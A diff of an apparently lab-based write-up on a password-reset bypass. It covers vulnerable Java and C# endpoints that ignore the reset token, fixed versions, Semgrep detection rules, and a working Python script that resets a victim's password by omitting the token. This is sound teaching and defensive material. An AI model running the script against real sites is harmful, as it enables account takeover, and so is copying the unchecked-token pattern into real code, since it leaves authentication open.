@@ -48,18 +48,25 @@ The flaw is a **Missing Validation Step**. The code likely checks the token when
 ### Java (Spring Boot)
 
 ```java
+// The DTO used for binding
+public class PasswordResetForm {
+    private String username;
+    private String newPassword;
+    private String token; // If missing in request, this stays null
+    // getters and setters
+}
+
 @PostMapping("/forgot-password")
-public String resetPassword(@RequestParam String username, 
-                            @RequestParam String newPassword, 
-                            @RequestParam(name="temp-forgot-password-token", required=false) String token) {
+public String resetPassword(@ModelAttribute PasswordResetForm form) {
     
-    // VULNERABLE: The token is accepted as an argument but NEVER CHECKED.
-    User user = userRepository.findByUsername(username);
+    // REALISTIC OVERSIGHT: 
+    // The developer focuses on finding the user to update.
+    User user = userRepository.findByUsername(form.getUsername());
     
     if (user != null) {
-        // FLAW: We assume that if they reached this endpoint, they must have had a valid token.
-        // But attackers can send POST requests directly without visiting the GET page first.
-        userService.changePassword(user, newPassword);
+        // VULNERABLE: The code assumes that if we are here, the validation happened upstream,
+        // or simply forgets to call tokenService.validate(form.getToken()).
+        userService.updatePassword(user, form.getNewPassword());
         return "redirect:/login?reset=success";
     }
     
@@ -69,33 +76,46 @@ public String resetPassword(@RequestParam String username,
 
 **Technical Flow & Syntax Explanation:**
 
-- **`@RequestParam ... required=false`**: The token is marked as optional (or simply ignored in the logic body).
-- **`userService.changePassword`**: The sensitive action is performed based solely on the `username` input. There is no `tokenRepository.verify(token)` call inside this method.
+- `@ModelAttribute PasswordResetForm form`: Spring binds the incoming HTTP parameters to the `form` object. If `temp-forgot-password-token` is missing from the request, `form.getToken()` is simply `null`. It does not trigger an error by default.
+- `if (user != null)`: The logic gate checks for the user's existence. Since the attacker provides a valid username (`carlos`), this condition is true.
+- Missing Check: There is no line checking `if (form.getToken() == null)` or verifying the token against the database. The code proceeds directly to `updatePassword`.
 
 ### C# (ASP.NET Core)
 
 ```csharp
-[HttpPost("reset-password")]
-public async Task<IActionResult> ResetPassword(ResetPasswordViewModel model)
+public class ResetPasswordModel
 {
-    var user = await _userManager.FindByNameAsync(model.Username);
-    if (user == null) return BadRequest();
+    public string Username { get; set; }
+    public string NewPassword { get; set; }
+    // Developer forgot [Required] attribute here
+    public string Token { get; set; } 
+}
 
-    // VULNERABLE: The 'Token' property exists in the model, but is ignored.
-    // var result = await _userManager.ResetPasswordAsync(user, model.Token, model.NewPassword);
+[HttpPost("reset-password")]
+public async Task<IActionResult> ResetPassword(ResetPasswordModel model)
+{
+    if (!ModelState.IsValid) return View(model);
+
+    var user = await _userManager.FindByNameAsync(model.Username);
+    if (user == null) return BadRequest("User not found");
+
+    // REALISTIC OVERSIGHT:
+    // The developer intends to reset the password.
+    // The framework's 'ResetPasswordAsync' usually requires a token,
+    // but the developer might be using a lower-level 'Remove/AddPassword' 
+    // or passing a generated token to satisfy the method signature.
     
-    // INSTEAD, the developer used a direct forced reset:
-    var token = await _userManager.GeneratePasswordResetTokenAsync(user); // Generates a new one internally?!
-    var result = await _userManager.ResetPasswordAsync(user, token, model.NewPassword);
+    // In this specific lab scenario, the custom logic likely looks like this:
+    _userService.SetPassword(user, model.NewPassword);
     
-    return Ok();
+    return Ok("Password changed");
 }
 ```
 
 **Technical Flow & Syntax Explanation:**
 
-- **Ignored Input**: The code might generate a *fresh* token internally to satisfy the API signature, completely bypassing the requirement for the user to provide the token sent to their email.
-- **Logic Gap**: The developer treats the POST request as an administrative "force reset" rather than a user-initiated "verify and reset."
+- `ResetPasswordModel`: Without the `[Required]` data annotation on the `Token` property, the model is considered "Valid" even if the token is missing.
+- `_userService.SetPassword`: The method performs the action based purely on the user object retrieved from the `model.Username`. The `model.Token` property is ignored entirely.
 
 ### Mock PR Comment
 
@@ -120,20 +140,22 @@ We must make the **Token** the source of truth, not the **Username**.
 
 ```java
 @PostMapping("/forgot-password")
-public String resetPassword(@RequestParam("token") String token, 
-                            @RequestParam("newPassword") String newPassword) {
+public String resetPassword(@ModelAttribute PasswordResetForm form) {
     
-    // SECURE: Lookup user BY TOKEN.
-    PasswordResetToken resetToken = tokenRepository.findByToken(token);
-    
+    // SECURE: Strict Null Check
+    if (form.getToken() == null || form.getToken().isEmpty()) {
+        return "redirect:/error?msg=missing_token";
+    }
+
+    // SECURE: Validate Token Logic
+    PasswordResetToken resetToken = tokenRepository.findByToken(form.getToken());
     if (resetToken == null || resetToken.isExpired()) {
         return "redirect:/error?msg=invalid_token";
     }
     
+    // Only derive user from the Valid Token
     User user = resetToken.getUser();
-    userService.changePassword(user, newPassword);
-    
-    // Burn the token so it can't be used again
+    userService.updatePassword(user, form.getNewPassword());
     tokenRepository.delete(resetToken);
     
     return "redirect:/login?reset=success";
@@ -143,17 +165,29 @@ public String resetPassword(@RequestParam("token") String token,
 ### Secure C#
 
 ```csharp
-[HttpPost("reset-password")]
-public async Task<IActionResult> ResetPassword(ResetPasswordViewModel model)
+public class ResetPasswordModel
 {
-    var user = await _userManager.FindByNameAsync(model.Username);
+    [Required] // SECURE: Framework enforces presence
+    public string Token { get; set; }
     
-    // SECURE: The framework's ResetPasswordAsync validates the token signature.
-    var result = await _userManager.ResetPasswordAsync(user, model.Token, model.NewPassword);
+    [Required]
+    public string NewPassword { get; set; }
+    // Username is optional/irrelevant if we trust the token
+}
+
+[HttpPost("reset-password")]
+public async Task<IActionResult> ResetPassword(ResetPasswordModel model)
+{
+    if (!ModelState.IsValid) return BadRequest(ModelState);
+
+    // SECURE: Verification Logic
+    var result = await _userManager.ResetPasswordAsync(
+        await _userManager.FindByNameAsync(model.Username), 
+        model.Token, 
+        model.NewPassword);
+        
+    if (!result.Succeeded) return BadRequest("Invalid Token");
     
-    if (!result.Succeeded) {
-        return BadRequest("Invalid token.");
-    }
     return Ok();
 }
 ```
@@ -170,23 +204,26 @@ import sys
 
 def exploit_reset_bypass(url, victim_username, new_password):
     target_url = f"{url.rstrip('/')}/forgot-password"
-
-    params = {"temp-forgot-password-token": ""}
-
+    
+    # We send a POST request mimicking the form submission
+    # but we deliberately OMIT the token parameter.
     data = {
-    "username": victim_username,
-    "new-password-1": new_password,
-    "new-password-2": new_password,
-    "temp-forgot-password-token": "" #empty token in body too
+        "username": victim_username,
+        "new-password-1": new_password,
+        "new-password-2": new_password
+        # "temp-forgot-password-token": "..."  <-- OMITTED
     }
-
+    
     print(f"[*] Targeting: {target_url}")
     print(f"[*] Resetting password for: {victim_username} -> {new_password}")
-
+    
     try:
-        resp = requests.post(target_url, params=params, data=data, allow_redirects=False)
+        # allow_redirects=False to catch the 302 success
+        resp = requests.post(target_url, data=data, allow_redirects=False)
+        
         print(f"[*] Status Code: {resp.status_code}")
-
+        
+        # Success is usually a redirect to /login?reset=success or similar
         if resp.status_code == 302 or (resp.status_code == 200 and "error" not in resp.text):
             print("[!!!] SUCCESS: Password reset request accepted.")
             print(f"[*] You can now login as {victim_username}:{new_password}")
@@ -220,27 +257,25 @@ rules:
   - id: java-unchecked-reset-token
     languages: [java]
     message: |
-      Password reset logic detected. Ensure the 'token' parameter is verified 
-      against the database before changing the password. 
-      Do not rely solely on the 'username' parameter.
+      Password reset logic detected. Ensure the 'token' field from the form 
+      is verified against the database before changing the password.
     severity: ERROR
     patterns:
       - pattern-inside: |
-          @PostMapping(...)
-          public $RET $METHOD(..., String $TOKEN, ...) { ... }
+          public $RET $METHOD($FORM $FORM_OBJ) { ... }
       - pattern: |
-          // Heuristic: Changing password without checking token
-          $SERVICE.changePassword($USER, ...);
+          // Heuristic: Changing password using form data without token validation
+          $SERVICE.updatePassword(..., $FORM_OBJ.getNewPassword());
       - pattern-not-inside: |
-          if ($TOKEN_REPO.findByToken($TOKEN) != null) { ... }
-      - pattern-not-inside: |
-          if ($SERVICE.validate($TOKEN)) { ... }
+          // We expect to see token validation before the update
+          if ($TOKEN_REPO.findByToken($FORM_OBJ.getToken()) != null) { ... }
 ```
 
 **Technical Flow & Syntax Explanation:**
 
-- **`pattern`**: Finds the critical action (`changePassword`).
-- **`pattern-not-inside`**: This is the safety check. If Semgrep sees a validation call (like `findByToken` or `validate`) wrapping the change password logic, it will *not* flag the code. If that check is missing, it alerts.
+- `$METHOD($FORM $FORM_OBJ)`: Matches a controller method taking a form object (e.g., `PasswordResetForm`).
+- `updatePassword`: Matches the critical state-changing operation.
+- `pattern-not-inside`: This ensures we only flag code that is missing the validation check (`findByToken`). If the check exists, the rule ignores it.
 
 ### C# Rule
 
@@ -248,12 +283,14 @@ rules:
 rules:
   - id: csharp-unchecked-reset-token
     languages: [csharp]
-    message: "Password reset logic ignores the token parameter."
+    message: "Password reset logic ignores the Token property."
     severity: ERROR
     patterns:
       - pattern-inside: |
-          public async Task<IActionResult> $METHOD(..., string $TOKEN, ...) { ... }
+          public async Task<IActionResult> $METHOD($MODEL $M) { ... }
       - pattern: |
-          // Heuristic: Resetting without passing token to the manager
-          _userManager.ResetPasswordAsync($USER, $IGNORED_TOKEN, ...);
+          // Heuristic: Resetting using username but ignoring M.Token
+          _userService.SetPassword($USER, $M.NewPassword);
+      - pattern-not-inside: |
+          _userManager.ResetPasswordAsync(..., $M.Token, ...);
 ```
